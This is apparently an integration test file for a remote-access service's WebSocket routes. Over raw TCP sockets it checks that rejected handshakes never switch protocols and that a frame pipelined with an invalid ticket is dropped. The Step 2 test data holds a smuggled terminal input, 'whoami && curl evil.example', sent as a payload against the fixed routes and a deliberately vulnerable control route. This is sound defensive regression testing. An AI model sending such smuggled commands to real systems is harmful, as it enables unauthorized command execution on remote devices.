/**
 * Wave 4 / Task 9 — Steps 1 and 2: raw pre-upgrade behaviour.
 *
 * WHAT THIS PROVES
 * ----------------
 * Every rejected remote WebSocket handshake is answered with a real HTTP
 * status on the raw TCP stream and NEVER with `101 Switching Protocols`, on
 * all three transports (terminal, desktop, tunnel). Nothing about that claim
 * can be checked through `app.request()`: the `101` is produced by
 * `@hono/node-ws`'s `server.on('upgrade')` handler, not by the Hono response
 * pipeline, so the only faithful observation point is a socket.
 *
 * Every request below is therefore written byte-for-byte onto a `node:net`
 * socket against a REAL `@hono/node-server` listener running the REAL route
 * factories (`createTerminalWsRoutes`, `createDesktopWsRoutes`,
 * `createTunnelWsRoutes`) with the REAL shared-lease manager, REAL Redis
 * tickets and REAL Postgres authorization. The first response line is parsed
 * and asserted exactly.
 *
 * Step 2 (`describe('Step 2 …')`) is the highest-value case: the HTTP upgrade
 * headers AND a masked WebSocket input frame are written in ONE TCP write with
 * an invalid ticket, proving a rejected handshake cannot smuggle a payload
 * through in the same packet.
 *
 * ISOLATION
 * ---------
 * Runs against the dedicated `breeze_test_w4` database and the shared test
 * Redis on :6380. Every session id is a fresh UUID, so the
 * `remote:ws:{kind:sessionId}:*` lease keys and `remote:ws_ticket:*` secrets
 * cannot collide with another wave; `afterAll` deletes every key this file
 * created (the `:generation` key is deliberately non-expiring in production,
 * so it must be removed explicitly).
 *
 * Run:
 *   DATABASE_URL=postgresql://breeze_test:breeze_test@localhost:5433/breeze_test_w4 \
 *   DATABASE_URL_APP=postgresql://breeze_app:breeze_test@localhost:5433/breeze_test_w4 \
 *   REDIS_URL=redis://localhost:6380 NODE_ENV=test \
 *   pnpm --filter=@breeze/api exec vitest run --config vitest.integration.config.ts \
 *     src/__tests__/integration/remote-ws-preupgrade.integration.test.ts
 */
import { randomBytes, randomUUID } from 'node:crypto';
import net from 'node:net';
import type { AddressInfo } from 'node:net';
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { Hono } from 'hono';
import { serve, type ServerType } from '@hono/node-server';
import { createNodeWebSocket } from '@hono/node-ws';
import { eq } from 'drizzle-orm';

// Tickets must live in the SAME backend production uses. The in-memory
// fallback is a real code path but it would not exercise the atomic
// Redis GET+DEL that makes a ticket one-time.
process.env.WS_TICKETS_REQUIRE_REDIS = 'true';

import './setup';
import { getTestDb, getTestRedis } from './setup';
import { setupTestEnvironment, type TestEnvironment } from './db-utils';

/**
 * The ONLY mock in this file. `sendCommandToAgent` is the sink every
 * transport uses to push user input at a device; Step 2 asserts it is never
 * reached. There is no connected agent in an integration run, so the real
 * function would silently return `false` and prove nothing — the spy makes
 * "the agent received nothing" an assertion instead of an accident.
 * Redis, Postgres, the HTTP server and the process boundary are all real.
 */
const { sendCommandToAgentMock } = vi.hoisted(() => ({
  sendCommandToAgentMock: vi.fn((_agentId: string, _command: unknown) => true),
}));
vi.mock('../../routes/agentWs', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../routes/agentWs')>();
  return { ...actual, sendCommandToAgent: sendCommandToAgentMock };
});

import { devices, remoteSessions, tunnelSessions, users } from '../../db/schema';
import { createTerminalWsRoutes } from '../../routes/terminalWs';
import { createDesktopWsRoutes } from '../../routes/desktopWs';
import { createTunnelWsRoutes } from '../../routes/tunnelWs';
import { createWsTicket } from '../../services/remoteSessionAuth';
import {
  createRemoteWsSharedLeaseManager,
  getRemoteWsRedisKeys,
  type RemoteWsSharedLeaseClaim,
} from '../../services/remoteWsSharedLease';
import { getRedis } from '../../services/redis';

// ---------------------------------------------------------------------------
// Environment contract
// ---------------------------------------------------------------------------

/**
 * `pre_upgrade` is the strict mode: it re-proves the live user / session /
 * site / permission / policy / rate-limit state BEFORE `upgradeWebSocket` is
 * ever reached, which is what makes 403/404/429 observable on the wire.
 * `assertRemoteWsPreUpgradeDrainComplete` refuses the mode unless both legacy
 * drains are complete, so the timestamps below are set far enough in the past
 * to satisfy `viewerIssuerDrained + 7200s + 60s`.
 */
const LONG_AGO = new Date(Date.now() - 9_000_000).toISOString();

function usePreUpgradeMode(): void {
  process.env.REMOTE_WS_AUTH_MODE = 'pre_upgrade';
  process.env.REMOTE_WS_LEGACY_TICKET_WRITER_DRAINED_AT = LONG_AGO;
  process.env.REMOTE_WS_LEGACY_VIEWER_ISSUER_DRAINED_AT = LONG_AGO;
}

function usePostUpgradeMode(): void {
  process.env.REMOTE_WS_AUTH_MODE = 'post_upgrade';
}

// ---------------------------------------------------------------------------
// Raw socket client
// ---------------------------------------------------------------------------

interface RawUpgradeResponse {
  /** Verbatim first line of the HTTP response, e.g. `HTTP/1.1 401 Unauthorized`. */
  statusLine: string;
  /** Status parsed out of the first line. */
  status: number;
  /** Everything the server wrote before closing. */
  raw: string;
}

/**
 * Write one HTTP upgrade request (optionally with trailing bytes appended to
 * the SAME `socket.write` call) and read the response off the wire.
 */
function rawUpgrade(input: {
  port: number;
  path: string;
  ticket?: string;
  userAgent?: string;
  /** Extra bytes pipelined into the very same TCP write as the headers. */
  pipelined?: Buffer;
}): Promise<RawUpgradeResponse> {
  return new Promise((resolve, reject) => {
    const query = input.ticket === undefined
      ? ''
      : `?ticket=${encodeURIComponent(input.ticket)}`;
    const headers = [
      `GET ${input.path}${query} HTTP/1.1`,
      `Host: 127.0.0.1:${input.port}`,
      'Upgrade: websocket',
      'Connection: Upgrade',
      `Sec-WebSocket-Key: ${randomBytes(16).toString('base64')}`,
      'Sec-WebSocket-Version: 13',
      `User-Agent: ${input.userAgent ?? 'breeze-raw-upgrade-test/1.0'}`,
      '',
      '',
    ].join('\r\n');

    const socket = net.connect({ host: '127.0.0.1', port: input.port });
    const chunks: Buffer[] = [];
    let settled = false;

    const finish = (): void => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      const raw = Buffer.concat(chunks).toString('utf8');
      const statusLine = raw.split('\r\n')[0] ?? '';
      const status = Number(statusLine.split(' ')[1] ?? '0');
      socket.destroy();
      resolve({ statusLine, status, raw });
    };

    const timer = setTimeout(() => {
      if (settled) return;
      settled = true;
      socket.destroy();
      reject(new Error(`raw upgrade timed out for ${input.path}`));
    }, 15_000);

    socket.on('error', (error) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      reject(error);
    });
    socket.on('data', (chunk: Buffer) => {
      chunks.push(chunk);
      // Both outcomes are fully determined by the first line: a rejection is
      // `socket.end(...)` (close follows immediately), a `101` keeps the
      // socket open forever, so resolve as soon as the head is complete.
      if (Buffer.concat(chunks).includes('\r\n\r\n')) finish();
    });
    socket.on('close', finish);
    socket.on('connect', () => {
      socket.write(
        input.pipelined
          ? Buffer.concat([Buffer.from(headers, 'utf8'), input.pipelined])
          : Buffer.from(headers, 'utf8'),
      );
    });
  });
}

/** A client-masked WebSocket text frame (RFC 6455 §5.2), payload < 126 bytes. */
function maskedTextFrame(payload: string): Buffer {
  const data = Buffer.from(payload, 'utf8');
  if (data.length > 125) throw new Error('test frame helper only handles short payloads');
  const mask = randomBytes(4);
  const masked = Buffer.alloc(data.length);
  for (let index = 0; index < data.length; index += 1) {
    masked[index] = (data[index] as number) ^ (mask[index % 4] as number);
  }
  return Buffer.concat([
    Buffer.from([0x81, 0x80 | data.length]),
    mask,
    masked,
  ]);
}

// ---------------------------------------------------------------------------
// Server under test
// ---------------------------------------------------------------------------

let server: ServerType;
let port: number;
/** Counts every construction of a transport's WebSocket event handler set. */
let handlerConstructions = 0;
/** Every lease slot this file touched, deleted in afterAll. */
const touchedSlots: Array<{ kind: 'terminal' | 'desktop' | 'tunnel'; sessionId: string }> = [];
/** Client sockets opened by the non-vacuity control, destroyed in afterAll. */
const openedSockets: net.Socket[] = [];
/** Frames the PRE-WAVE-shaped control route received despite rejecting the ticket. */
const preWaveLeakedFrames: string[] = [];
let preWaveCloses = 0;

function trackSlot(kind: 'terminal' | 'desktop' | 'tunnel', sessionId: string): string {
  touchedSlots.push({ kind, sessionId });
  return sessionId;
}

/**
 * The shared-lease topology monitor refuses admission unless Redis reports
 * `aof_enabled:1`, `noeviction`, `cluster_enabled:0` and role `master`. The
 * shared test Redis (docker-compose.test.yml) boots with `--appendonly no`,
 * so bring it to the supported production shape for the duration of this file
 * and put it back afterwards. This configures the REAL Redis; it does not
 * stub the monitor.
 */
let originalAppendOnly = 'no';

beforeAll(async () => {
  usePreUpgradeMode();

  const redis = getTestRedis();
  const current = (await redis.config('GET', 'appendonly')) as unknown as string[];
  originalAppendOnly = current[1] ?? 'no';
  if (originalAppendOnly !== 'yes') await redis.config('SET', 'appendonly', 'yes');

  const app = new Hono();
  const { injectWebSocket, upgradeWebSocket } = createNodeWebSocket({ app });

  // Wrap the adapter so the handler-construction count is observable. Hono's
  // `defineWebSocketHelper` calls `createEvents(c)` inside the ROUTE handler,
  // i.e. only once the pre-upgrade middleware has called `next()`.
  const spyUpgrade = ((createEvents: (c: unknown) => unknown, options?: unknown) =>
    upgradeWebSocket(
      ((c: unknown) => {
        handlerConstructions += 1;
        return createEvents(c);
      }) as never,
      options as never,
    )) as unknown as Parameters<typeof createTerminalWsRoutes>[0];

  const api = new Hono();
  api.route('/remote/sessions', createTerminalWsRoutes(spyUpgrade));
  api.route('/desktop-ws', createDesktopWsRoutes(spyUpgrade));
  api.route('/tunnel-ws', createTunnelWsRoutes(spyUpgrade as never));
  app.route('/api/v1', api);

  // NEGATIVE CONTROL — the PRE-WAVE arrangement, mounted on the very same
  // listener and adapter as the real routes. It reproduces exactly what the
  // code did before this wave: no validate-and-reserve middleware, the socket
  // is upgraded unconditionally and the ticket is only inspected inside
  // `onOpen`, which then closes. Step 2 asserts that the fixed routes drop a
  // pipelined frame; this route exists to prove the identical bytes are NOT
  // inert — the pre-wave shape hands them straight to `onMessage`.
  app.get(
    '/__control__/pre-wave/:id/ws',
    upgradeWebSocket(() => ({
      onOpen: (_event: unknown, ws: { close: (code: number, reason: string) => void }) => {
        // "Validation" after the upgrade: always rejects, exactly like an
        // invalid ticket would have.
        preWaveCloses += 1;
        ws.close(1008, 'invalid ticket');
      },
      onMessage: (event: { data: unknown }) => {
        preWaveLeakedFrames.push(String(event.data));
      },
      onClose: () => undefined,
      onError: () => undefined,
    })),
  );

  server = serve({ fetch: app.fetch, hostname: '127.0.0.1', port: 0 });
  injectWebSocket(server);
  await new Promise<void>((resolve) => {
    if ((server.address() as AddressInfo | null)?.port) return resolve();
    server.once('listening', () => resolve());
  });
  port = (server.address() as AddressInfo).port;
});

afterAll(async () => {
  for (const socket of openedSockets) socket.destroy();
  const redis = getTestRedis();
  const keys: string[] = [];
  for (const slot of touchedSlots) {
    const slotKeys = getRemoteWsRedisKeys(slot.kind, slot.sessionId);
    keys.push(slotKeys.owner, slotKeys.generation);
    if (slotKeys.finalizing) keys.push(slotKeys.finalizing);
    if (slotKeys.finalizationPayload) keys.push(slotKeys.finalizationPayload);
  }
  if (keys.length > 0) await redis.del(...keys);
  if (originalAppendOnly !== 'yes') await redis.config('SET', 'appendonly', originalAppendOnly);
  await new Promise<void>((resolve) => server.close(() => resolve()));
});

beforeEach(() => {
  handlerConstructions = 0;
  sendCommandToAgentMock.mockClear();
  usePreUpgradeMode();
});

// ---------------------------------------------------------------------------
// Route table
// ---------------------------------------------------------------------------

type Kind = 'terminal' | 'desktop' | 'tunnel';

const ROUTES: Array<{ kind: Kind; path: (id: string) => string }> = [
  { kind: 'terminal', path: (id) => `/api/v1/remote/sessions/${id}/ws` },
  { kind: 'desktop', path: (id) => `/api/v1/desktop-ws/${id}/ws` },
  { kind: 'tunnel', path: (id) => `/api/v1/tunnel-ws/${id}/ws` },
];

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

interface AuthorizedFixture {
  env: TestEnvironment;
  deviceId: string;
  sessionId: string;
}

async function insertOnlineDevice(orgId: string, siteId: string): Promise<string> {
  const agentId = `agent-w4-preupgrade-${randomUUID()}`;
  const [row] = await getTestDb()
    .insert(devices)
    .values({
      orgId,
      siteId,
      agentId,
      hostname: `w4-preupgrade-${agentId.slice(-12)}`,
      displayName: 'W4 Pre-upgrade Host',
      osType: 'windows',
      osVersion: '11',
      osBuild: '22000',
      architecture: 'x86_64',
      agentVersion: '0.0.0-test',
      status: 'online',
      enrolledAt: new Date(),
    })
    .returning({ id: devices.id });
  if (!row) throw new Error('insertOnlineDevice: no row returned');
  return row.id;
}

/**
 * A session that WILL pass `authorizeConsumedRemoteWsTicket`: active user with
 * `*:*` grants, org membership, online device, default (permissive) remote
 * access policy, and a session in `pending`.
 *
 * `pending` matters for desktop: `recoverDesktopFinalizationOrphan` treats a
 * `pending` row younger than 90 s as `not_orphaned`, which is exactly the real
 * admission window a browser connects in.
 */
async function createAuthorizedSession(kind: Kind): Promise<AuthorizedFixture> {
  const env = await setupTestEnvironment();
  const deviceId = await insertOnlineDevice(env.organization.id, env.site.id);
  const tdb = getTestDb();

  if (kind === 'tunnel') {
    const [row] = await tdb
      .insert(tunnelSessions)
      .values({
        deviceId,
        orgId: env.organization.id,
        userId: env.user.id,
        type: 'proxy',
        status: 'pending',
        targetHost: '127.0.0.1',
        targetPort: 8080,
      })
      .returning({ id: tunnelSessions.id });
    if (!row) throw new Error('createAuthorizedSession: no tunnel row');
    return { env, deviceId, sessionId: trackSlot(kind, row.id) };
  }

  const [row] = await tdb
    .insert(remoteSessions)
    .values({
      deviceId,
      orgId: env.organization.id,
      userId: env.user.id,
      type: kind,
      status: 'pending',
      iceCandidates: [],
    })
    .returning({ id: remoteSessions.id });
  if (!row) throw new Error('createAuthorizedSession: no remote session row');
  return { env, deviceId, sessionId: trackSlot(kind, row.id) };
}

async function ticketFor(input: {
  sessionId: string;
  sessionType: Kind;
  userId: string;
}): Promise<string> {
  const { ticket } = await createWsTicket({
    sessionId: input.sessionId,
    sessionType: input.sessionType,
    userId: input.userId,
    mfaSatisfied: true,
  });
  return ticket;
}

/**
 * Take the shared owner out-of-band with an INDEPENDENT manager (its own boot
 * instance id) so the route's own manager must observe a foreign owner.
 */
async function holdSharedOwner(kind: Kind, sessionId: string): Promise<RemoteWsSharedLeaseClaim> {
  const redis = getRedis();
  if (!redis) throw new Error('redis unavailable for lease pre-acquisition');
  const foreign = createRemoteWsSharedLeaseManager({
    redis,
    instanceId: randomUUID(),
    requiredTopology: 'standalone-single-primary',
  });
  const acquired = await foreign.acquire(kind, sessionId);
  if (!acquired.ok) throw new Error(`lease pre-acquisition failed: ${acquired.reason}`);
  return acquired.claim;
}

// ---------------------------------------------------------------------------
// Step 1 — raw HTTP upgrade rejections
// ---------------------------------------------------------------------------

describe('Step 1: raw HTTP upgrade rejections never reach 101', () => {
  it.each(ROUTES)('$kind — missing ticket is 401 on the wire', async ({ kind, path }) => {
    const sessionId = trackSlot(kind, randomUUID());
    const response = await rawUpgrade({ port, path: path(sessionId) });

    expect(response.statusLine).toBe('HTTP/1.1 401 Unauthorized');
    expect(response.status).toBe(401);
    expect(response.raw).not.toContain('101 Switching Protocols');
    expect(handlerConstructions).toBe(0);
  });

  it.each(ROUTES)('$kind — invalid ticket is 401 on the wire', async ({ kind, path }) => {
    const sessionId = trackSlot(kind, randomUUID());
    const response = await rawUpgrade({
      port,
      path: path(sessionId),
      ticket: randomBytes(32).toString('base64url'),
    });

    expect(response.statusLine).toBe('HTTP/1.1 401 Unauthorized');
    expect(response.raw).not.toContain('101 Switching Protocols');
    expect(handlerConstructions).toBe(0);
  });

  it.each(ROUTES)('$kind — a ticket is one-time: the second use is 401', async ({ kind, path }) => {
    // The session does not exist, so the FIRST request is rejected at the live
    // authorization step — but the ticket has already been atomically consumed
    // by then. Reuse must therefore fail as an unknown ticket, not as 404.
    const sessionId = trackSlot(kind, randomUUID());
    const env = await setupTestEnvironment();
    const ticket = await ticketFor({ sessionId, sessionType: kind, userId: env.user.id });

    const first = await rawUpgrade({ port, path: path(sessionId), ticket });
    expect(first.statusLine).toBe('HTTP/1.1 404 Not Found');
    expect(first.raw).not.toContain('101 Switching Protocols');

    const second = await rawUpgrade({ port, path: path(sessionId), ticket });
    expect(second.statusLine).toBe('HTTP/1.1 401 Unauthorized');
    expect(second.raw).not.toContain('101 Switching Protocols');
    expect(handlerConstructions).toBe(0);
  });

  it.each(ROUTES)('$kind — a ticket bound to another session is 401', async ({ kind, path }) => {
    const ticketSession = trackSlot(kind, randomUUID());
    const attackedSession = trackSlot(kind, randomUUID());
    const env = await setupTestEnvironment();
    const ticket = await ticketFor({
      sessionId: ticketSession,
      sessionType: kind,
      userId: env.user.id,
    });

    const response = await rawUpgrade({ port, path: path(attackedSession), ticket });

    expect(response.statusLine).toBe('HTTP/1.1 401 Unauthorized');
    expect(response.raw).not.toContain('101 Switching Protocols');
    expect(handlerConstructions).toBe(0);
  });

  it('a ticket minted for one transport cannot be replayed on another', async () => {
    const sessionId = trackSlot('desktop', randomUUID());
    const env = await setupTestEnvironment();
    // Same session id, wrong transport: `consumeRemoteWsUpgradeTicket`
    // compares `sessionType` against the route's `expectedType`.
    const terminalTicket = await ticketFor({
      sessionId,
      sessionType: 'terminal',
      userId: env.user.id,
    });

    const response = await rawUpgrade({
      port,
      path: `/api/v1/desktop-ws/${sessionId}/ws`,
      ticket: terminalTicket,
    });

    expect(response.statusLine).toBe('HTTP/1.1 401 Unauthorized');
    expect(response.raw).not.toContain('101 Switching Protocols');
    expect(handlerConstructions).toBe(0);
  });

  it.each(ROUTES)('$kind — an unknown session is 404 before any upgrade', async ({ kind, path }) => {
    const sessionId = trackSlot(kind, randomUUID());
    const env = await setupTestEnvironment();
    const ticket = await ticketFor({ sessionId, sessionType: kind, userId: env.user.id });

    const response = await rawUpgrade({ port, path: path(sessionId), ticket });

    expect(response.statusLine).toBe('HTTP/1.1 404 Not Found');
    expect(response.raw).not.toContain('101 Switching Protocols');
    expect(handlerConstructions).toBe(0);
  });

  it.each(ROUTES)(
    "$kind — a ticket for another user's session is 403 before any upgrade",
    async ({ kind, path }) => {
      const owner = await createAuthorizedSession(kind);
      const intruder = await setupTestEnvironment();
      // The ticket is legitimately minted FOR the intruder, but names the
      // victim's session id — the live check must reject on ownership.
      const ticket = await ticketFor({
        sessionId: owner.sessionId,
        sessionType: kind,
        userId: intruder.user.id,
      });

      const response = await rawUpgrade({ port, path: path(owner.sessionId), ticket });

      expect(response.statusLine).toBe('HTTP/1.1 403 Forbidden');
      expect(response.raw).not.toContain('101 Switching Protocols');
      expect(handlerConstructions).toBe(0);
    },
  );

  it.each(ROUTES)(
    '$kind — a deactivated user is 403 even with a valid ticket',
    async ({ kind, path }) => {
      const fixture = await createAuthorizedSession(kind);
      const ticket = await ticketFor({
        sessionId: fixture.sessionId,
        sessionType: kind,
        userId: fixture.env.user.id,
      });
      // Revoke access AFTER the ticket was minted: the whole point of
      // `pre_upgrade` is that the ticket is not a standing authorization.
      await getTestDb()
        .update(users)
        .set({ status: 'disabled' })
        .where(eq(users.id, fixture.env.user.id));

      const response = await rawUpgrade({ port, path: path(fixture.sessionId), ticket });

      expect(response.statusLine).toBe('HTTP/1.1 403 Forbidden');
      expect(response.raw).not.toContain('101 Switching Protocols');
      expect(handlerConstructions).toBe(0);
    },
  );

  it.each(ROUTES)(
    '$kind — a second owner is refused with 409 before 101',
    async ({ kind, path }) => {
      const fixture = await createAuthorizedSession(kind);
      const held = await holdSharedOwner(kind, fixture.sessionId);
      expect(held.generation).toBeGreaterThan(0);

      const ticket = await ticketFor({
        sessionId: fixture.sessionId,
        sessionType: kind,
        userId: fixture.env.user.id,
      });
      const response = await rawUpgrade({ port, path: path(fixture.sessionId), ticket });

      expect(response.statusLine).toBe('HTTP/1.1 409 Conflict');
      expect(response.raw).not.toContain('101 Switching Protocols');
      expect(handlerConstructions).toBe(0);

      // The incumbent owner survived the rejected challenger untouched.
      const ownerKey = getRemoteWsRedisKeys(kind, fixture.sessionId).owner;
      expect(await getTestRedis().get(ownerKey)).toBe(held.ownerValue);
    },
  );

  it('rate limiting is enforced before the upgrade (429 on the 11th attempt)', async () => {
    const fixture = await createAuthorizedSession('terminal');
    // Hold the owner so every attempt stops at the SAME place (409) and the
    // only thing that changes across the loop is the per-user rate counter.
    await holdSharedOwner('terminal', fixture.sessionId);

    const observed: number[] = [];
    for (let attempt = 0; attempt < 11; attempt += 1) {
      const ticket = await ticketFor({
        sessionId: fixture.sessionId,
        sessionType: 'terminal',
        userId: fixture.env.user.id,
      });
      const response = await rawUpgrade({
        port,
        path: `/api/v1/remote/sessions/${fixture.sessionId}/ws`,
        ticket,
      });
      expect(response.raw).not.toContain('101 Switching Protocols');
      observed.push(response.status);
    }

    expect(observed.slice(0, 10)).toEqual(Array(10).fill(409));
    expect(observed[10]).toBe(429);
    expect(handlerConstructions).toBe(0);
  });

  it('post_upgrade still refuses a missing or invalid ticket before 101', async () => {
    usePostUpgradeMode();
    const sessionId = trackSlot('tunnel', randomUUID());

    const missing = await rawUpgrade({
      port,
      path: `/api/v1/tunnel-ws/${sessionId}/ws`,
    });
    const invalid = await rawUpgrade({
      port,
      path: `/api/v1/tunnel-ws/${sessionId}/ws`,
      ticket: randomBytes(32).toString('base64url'),
    });

    expect(missing.statusLine).toBe('HTTP/1.1 401 Unauthorized');
    expect(invalid.statusLine).toBe('HTTP/1.1 401 Unauthorized');
    expect(missing.raw).not.toContain('101 Switching Protocols');
    expect(invalid.raw).not.toContain('101 Switching Protocols');
    expect(handlerConstructions).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Non-vacuity control for `handlerConstructions`
// ---------------------------------------------------------------------------

describe('control: the handler-construction counter can actually increment', () => {
  it('a ticket that passes intake DOES construct the handler and DOES reach 101', async () => {
    // `post_upgrade` defers the live DB checks, so a valid ticket + free lease
    // is sufficient to cross the seam. If this test ever stopped reaching 101,
    // every `expect(handlerConstructions).toBe(0)` above would be vacuous.
    usePostUpgradeMode();
    const fixture = await createAuthorizedSession('terminal');
    const ticket = await ticketFor({
      sessionId: fixture.sessionId,
      sessionType: 'terminal',
      userId: fixture.env.user.id,
    });

    const response = await rawUpgrade({
      port,
      path: `/api/v1/remote/sessions/${fixture.sessionId}/ws`,
      ticket,
    });

    expect(response.statusLine).toBe('HTTP/1.1 101 Switching Protocols');
    expect(handlerConstructions).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Step 2 — pipelined-frame regression
// ---------------------------------------------------------------------------

describe('Step 2: a rejected handshake cannot smuggle a pipelined frame', () => {
  const PIPELINED: Record<Kind, string> = {
    terminal: JSON.stringify({ type: 'input', data: 'whoami && curl evil.example\n' }),
    desktop: JSON.stringify({ type: 'input', event: 'key', key: 'Meta', down: true }),
    tunnel: JSON.stringify({ type: 'data', data: 'R0VUIC8gSFRUUC8xLjENCg==' }),
  };

  it.each(ROUTES)(
    '$kind — headers + masked frame in ONE TCP write with an invalid ticket',
    async ({ kind, path }) => {
      const sessionId = trackSlot(kind, randomUUID());

      const response = await rawUpgrade({
        port,
        path: path(sessionId),
        ticket: randomBytes(32).toString('base64url'),
        pipelined: maskedTextFrame(PIPELINED[kind]),
      });

      // 1. No protocol switch.
      expect(response.status).toBe(401);
      expect(response.statusLine).toBe('HTTP/1.1 401 Unauthorized');
      expect(response.raw).not.toContain('101 Switching Protocols');
      // 2. The upgrade handler set was never constructed, so no `onMessage`
      //    closure exists that could have received the buffered frame.
      expect(handlerConstructions).toBe(0);
      // 3. Nothing reached the agent: no terminal input, no desktop input,
      //    no tunnel data.
      expect(sendCommandToAgentMock).not.toHaveBeenCalled();
      // 4. No lease was reserved for the session the frame targeted.
      const keys = getRemoteWsRedisKeys(kind, sessionId);
      expect(await getTestRedis().exists(keys.owner)).toBe(0);
      expect(await getTestRedis().exists(keys.generation)).toBe(0);
    },
  );

  it('NEGATIVE CONTROL: the pre-wave shape accepts the identical pipelined frame', async () => {
    // Same server, same adapter, same single TCP write, same masked frame,
    // same rejected ticket — the ONLY difference is that this route has no
    // validate-and-reserve middleware and inspects the ticket inside `onOpen`,
    // which is what the code did before Wave 4.
    //
    // If this test ever stopped observing a `101` + a delivered frame, every
    // Step 2 assertion above would be vacuous: it would mean the test vector
    // is inert bytes rather than a real smuggling attempt.
    const before = preWaveLeakedFrames.length;
    const smuggled = JSON.stringify({ type: 'input', data: 'whoami && curl evil.example\n' });

    const response = await rawUpgrade({
      port,
      path: `/__control__/pre-wave/${randomUUID()}/ws`,
      ticket: randomBytes(32).toString('base64url'),
      pipelined: maskedTextFrame(smuggled),
    });

    expect(response.statusLine).toBe('HTTP/1.1 101 Switching Protocols');

    const deadline = Date.now() + 5_000;
    while (preWaveLeakedFrames.length === before && Date.now() < deadline) {
      await new Promise((resolve) => setTimeout(resolve, 25));
    }

    // The handshake was rejected by the handler AND the payload still arrived.
    expect(preWaveCloses).toBeGreaterThan(0);
    expect(preWaveLeakedFrames.slice(before)).toContain(smuggled);
  });

  it('all three transports pipelined in sequence leave the agent sink empty', async () => {
    for (const route of ROUTES) {
      const sessionId = trackSlot(route.kind, randomUUID());
      const response = await rawUpgrade({
        port,
        path: route.path(sessionId),
        ticket: 'not-a-real-ticket',
        pipelined: maskedTextFrame(PIPELINED[route.kind]),
      });
      expect(response.status).toBe(401);
      expect(response.raw).not.toContain('101 Switching Protocols');
    }

    expect(handlerConstructions).toBe(0);
    expect(sendCommandToAgentMock).toHaveBeenCalledTimes(0);
  });
});
